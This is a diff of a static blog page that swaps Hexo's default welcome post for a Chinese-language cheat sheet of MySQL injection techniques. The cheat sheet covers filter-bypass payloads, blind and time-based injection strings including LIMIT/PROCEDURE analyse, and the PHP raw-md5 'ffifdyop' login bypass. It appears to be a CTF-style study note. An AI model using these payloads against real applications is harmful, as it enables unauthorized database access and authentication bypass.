@@ -79,7 +79,7 @@
 <link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="MySQL Injection," />
 
 
 
@@ -97,17 +97,18 @@
 
 
 
-<meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta name="description" content="总结一下mysql中用的到的技巧 常量：true，false，null，\N，current_timestamp变量：@myvar:=1 系统变量：@@version,@@datadir….. 常用函数：version(),pi()(圆周率),pow(x,y)(返回X的Y次方,char(),substring() 字符串生成：hex(),conv()(数字进制转换) 有关于字符串生成的：true=">
+<meta name="keywords" content="MySQL Injection">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Test">
-<meta property="og:url" content="https://alisitaweb.github.io/2017/09/05/hello-world/index.html">
+<meta property="og:title" content="MySQL 一些注入技巧">
+<meta property="og:url" content="https://alisitaweb.github.io/2017/09/07/MySQL-一些注入技巧/index.html">
 <meta property="og:site_name" content="Alisita&#39;s blogs">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="总结一下mysql中用的到的技巧 常量：true，false，null，\N，current_timestamp变量：@myvar:=1 系统变量：@@version,@@datadir….. 常用函数：version(),pi()(圆周率),pow(x,y)(返回X的Y次方,char(),substring() 字符串生成：hex(),conv()(数字进制转换) 有关于字符串生成的：true=">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-09-05T09:03:45.103Z">
+<meta property="og:updated_time" content="2017-09-07T06:30:13.366Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Test">
-<meta name="twitter:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta name="twitter:title" content="MySQL 一些注入技巧">
+<meta name="twitter:description" content="总结一下mysql中用的到的技巧 常量：true，false，null，\N，current_timestamp变量：@myvar:=1 系统变量：@@version,@@datadir….. 常用函数：version(),pi()(圆周率),pow(x,y)(返回X的Y次方,char(),substring() 字符串生成：hex(),conv()(数字进制转换) 有关于字符串生成的：true=">
 
 
 
@@ -137,13 +138,13 @@
 
 
 
-  <link rel="canonical" href="https://alisitaweb.github.io/2017/09/05/hello-world/"/>
+  <link rel="canonical" href="https://alisitaweb.github.io/2017/09/07/MySQL-一些注入技巧/"/>
 
 
 
 
 
-  <title>Test | Alisita's blogs</title>
+  <title>MySQL 一些注入技巧 | Alisita's blogs</title>
   
 
 
@@ -311,7 +312,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://alisitaweb.github.io/2017/09/05/hello-world/">
+    <link itemprop="mainEntityOfPage" href="https://alisitaweb.github.io/2017/09/07/MySQL-一些注入技巧/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="yuanbo">
@@ -328,7 +329,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Test</h1>
+          <h1 class="post-title" itemprop="name headline">MySQL 一些注入技巧</h1>
         
 
         <div class="post-meta">
@@ -340,8 +341,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-05T10:26:15+08:00">
-                2017-09-05
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-07T14:29:07+08:00">
+                2017-09-07
               </time>
             
 
@@ -350,6 +351,28 @@
             
           </span>
 
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/SQL-Injection/" itemprop="url" rel="index">
+                    <span itemprop="name">SQL Injection</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -378,15 +401,29 @@
       
 
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
+        <h3 id="总结一下mysql中用的到的技巧"><a href="#总结一下mysql中用的到的技巧" class="headerlink" title="总结一下mysql中用的到的技巧"></a>总结一下mysql中用的到的技巧</h3><hr>
+<p><strong>常量</strong>：true，false，null，\N，current_timestamp变量：@myvar:=1</p>
+<p><strong>系统变量</strong>：@@version,@@datadir…..</p>
+<p><strong>常用函数</strong>：version(),pi()(圆周率),pow(x,y)(返回X的Y次方,char(),substring()</p>
+<p><strong>字符串生成</strong>：hex(),conv()(数字进制转换)</p>
+<p><strong>有关于字符串生成的</strong>：true=1,floor(pi())=3,ceil(pi())=4,floor(version())=5,ceil(version())=6….</p>
+<hr>
+<h3 id="过滤的绕过"><a href="#过滤的绕过" class="headerlink" title="过滤的绕过"></a>过滤的绕过</h3><p> <em>空格</em>：%20, %09, %0a, %0b, %0c, %0d, %a0，还有一些可以利用括号或者注释  </p>
+<p> <em>and，or</em>：||，&amp;&amp; </p>
+<p> <em>union select</em>：<br> 利用括号，’and(true)like(false)union(select(pass)from(users))，<br> 方括号union [all|distinct] select pass from users#，  union%a0select pass from users，<br> 或者内联注释union/<em>&amp;sort=</em>/select pass from users#  </p>
+<p> <em>union</em>：子查询进行盲注and length((select pass from users having substr(pass,1,1)=’a’))  </p>
+<p> <em>having</em>：and(select substr(group_concat(pass),1,1)from users)=’a  </p>
+<p> <em>select … from(过滤代码如/SELECT\s+[A-Za-z.]+\s+FROM/i/i)</em>：<br>select [all|distinct] pass from users  select<code>table_name</code>from<code>information_schema</code> . <code>tables</code><br>select pass as alias from users  select pass aliasalias from users<br>select pass<code>alias alias</code>from users  select+pass%a0from(users)  </p>
+<p> <em>select,and,&amp;</em>：  这里就是可以利用上一篇文章中提到的false注入的方式进行绕过，具体见上文</p>
+<p> <em>不使用逗号</em>：’ and substr(data from 1 for 1) = ‘a’#</p>
+<h3 id="不同情境的注入技巧"><a href="#不同情境的注入技巧" class="headerlink" title="不同情境的注入技巧"></a>不同情境的注入技巧</h3><h4 id="like"><a href="#like" class="headerlink" title="like"></a>like</h4><p> 有时候可以利用一些逻辑语句进行注入<br> <code>if((select(left((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),3))like(0x2562)),name,price)</code></p>
+<h4 id="Limit"><a href="#Limit" class="headerlink" title="Limit"></a>Limit</h4><p>  limit后面可以跟两个函数，PROCEDURE 和 INTO（需要写权限）<br>  利用PROCEDURE 有两种方式，基于报错和时间，参考文章<a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html" target="_blank" rel="external">MySQL下Limit注入方法</a><br>  5.6以上好像不行了QAQ。。。。。<br>  基于报错<br>  <code>mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</code></p>
+<p>  基于时间<br>  <code>SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</code></p>
+<h4 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h4><p> order by 后面的数字也可以作为一个注入点，参考文章<a href="https://www.secpulse.com/archives/57197.html" target="_blank" rel="external">MySQL Order By 注入总结</a><br> 这里就不多写了</p>
+<h4 id="一些函数"><a href="#一些函数" class="headerlink" title="一些函数"></a>一些函数</h4><h5 id="不常用函数绕过滤"><a href="#不常用函数绕过滤" class="headerlink" title="不常用函数绕过滤"></a>不常用函数绕过滤</h5><p> <code>lpad(data,1,space(1))  // lpad(&#39;hi&#39;,4,&#39;?&#39;) = &#39;??hi&#39;</code><br> <code>rpad(data,1,space(1)) // rpad(&#39;hi&#39;,4,&#39;?&#39;) = &#39;hi??&#39;</code></p>
+<h5 id="搜索匹配类的函数"><a href="#搜索匹配类的函数" class="headerlink" title="搜索匹配类的函数"></a>搜索匹配类的函数</h5><p> <code>&#39;-if(locate(&#39;f&#39;,data),1,0)#&#39;</code><br> <code>&#39;-if(locate(&#39;fo&#39;,data)1,0)#&#39;</code><br> <code>&#39;-if(locate(&#39;foo&#39;,data),1,0)#&#39;</code><br> <code>instr()</code><br> <code>position()</code></p>
+<h5 id="使用函数进行字符串切割"><a href="#使用函数进行字符串切割" class="headerlink" title="使用函数进行字符串切割"></a>使用函数进行字符串切割</h5><p><code>length(trim(leading &#39;a&#39; from data))</code><br><code>length(replace(data,&#39;a&#39;,&#39;&#39;))</code></p>
+<h4 id="关于PHP中md5的一个姿势"><a href="#关于PHP中md5的一个姿势" class="headerlink" title="关于PHP中md5的一个姿势"></a>关于PHP中md5的一个姿势</h4><p>例如，PHP中有这么一段SQL语句<br><code>$sql = &quot;select * from admin where pass = &#39;&quot;.md5($password,true).&quot;&#39;&quot;;</code><br>这里是可以注入的，关于PHP中md5函数<br>如果可选的raw_output被设置为TRUE，那么md5报文摘要将以16字节长度的原始二进制返回<br><strong>就是说找到一个字符串md5的二进制和字符编码中的某些编码对上，就会产生注入，这里贴出一个原文作者找到的字符串，ffifdyop,md5加密后对应的字符串是 <code>&#39;or&#39;&lt;trash&gt;</code></strong><br><a href="http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes" target="_blank" rel="external">原文</a></p>
 
       
     </div>
@@ -404,6 +441,12 @@
 
     <footer class="post-footer">
       
+        <div class="post-tags">
+          
+            <a href="/tags/MySQL-Injection/" rel="tag"><i class="fa fa-tag"></i> MySQL Injection</a>
+          
+        </div>
+      
 
       
       
@@ -413,15 +456,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2017/09/06/MySQL-False注入姿势学习/" rel="next" title="MySQL False 注入姿势学习">
+                <i class="fa fa-chevron-left"></i> MySQL False 注入姿势学习
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/09/05/new-article/" rel="prev" title="new article">
-                new article <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -585,7 +628,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-Start"><span class="nav-number">1.</span> <span class="nav-text">Quick Start</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-new-post"><span class="nav-number">1.1.</span> <span class="nav-text">Create a new post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Run-server"><span class="nav-number">1.2.</span> <span class="nav-text">Run server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-static-files"><span class="nav-number">1.3.</span> <span class="nav-text">Generate static files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploy-to-remote-sites"><span class="nav-number">1.4.</span> <span class="nav-text">Deploy to remote sites</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结一下mysql中用的到的技巧"><span class="nav-number">1.</span> <span class="nav-text">总结一下mysql中用的到的技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#过滤的绕过"><span class="nav-number">2.</span> <span class="nav-text">过滤的绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#不同情境的注入技巧"><span class="nav-number">3.</span> <span class="nav-text">不同情境的注入技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#like"><span class="nav-number">3.1.</span> <span class="nav-text">like</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Limit"><span class="nav-number">3.2.</span> <span class="nav-text">Limit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#order-by"><span class="nav-number">3.3.</span> <span class="nav-text">order by</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#一些函数"><span class="nav-number">3.4.</span> <span class="nav-text">一些函数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#不常用函数绕过滤"><span class="nav-number">3.4.1.</span> <span class="nav-text">不常用函数绕过滤</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#搜索匹配类的函数"><span class="nav-number">3.4.2.</span> <span class="nav-text">搜索匹配类的函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用函数进行字符串切割"><span class="nav-number">3.4.3.</span> <span class="nav-text">使用函数进行字符串切割</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#关于PHP中md5的一个姿势"><span class="nav-number">3.5.</span> <span class="nav-text">关于PHP中md5的一个姿势</span></a></li></ol></li></ol></div>
             
 
           </div>
